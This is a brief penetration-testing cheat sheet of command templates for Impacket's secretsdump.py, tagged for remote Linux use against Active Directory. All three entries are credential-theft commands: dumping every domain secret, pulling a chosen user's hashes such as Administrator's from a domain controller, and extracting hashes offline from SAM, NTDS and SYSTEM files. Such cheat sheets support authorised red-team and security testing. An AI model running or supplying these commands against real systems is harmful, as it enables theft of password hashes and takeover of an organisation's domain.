# secretsdump
#target/remote #os/linux #cat/ad

## secretsdump all secrets
```
secretsdump.py <domain>/'<user>'<impacket_target_auth>
```

## secretsdump target user
```
secretsdump.py <domain>/'<user>'<impacket_target_auth> -just-dc-user <target_user|Administrator>
```

## secretsdump local
```
secretsdump.py LOCAL -sam <sam|SAM> -ntds <ntds|NTDS> -system <system|SYSTEM>
```
